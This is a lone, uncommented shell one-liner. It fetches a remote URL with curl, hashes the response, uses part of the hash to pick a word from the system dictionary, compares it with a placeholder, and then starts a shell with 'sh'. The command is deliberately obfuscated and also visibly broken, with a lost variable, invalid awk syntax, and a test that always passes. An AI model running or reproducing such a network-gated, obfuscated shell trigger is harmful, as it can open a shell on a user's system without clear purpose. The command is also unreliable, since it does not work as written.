curl -s[URL]|shasum|read h;echo ${h:0:4}|xargs -I{} sh -c "awk 'NR==0x{}'/usr/share/dict/words|tr '\n' '-'|xargs -I{} test '{}'='word1-word2'&&sh"
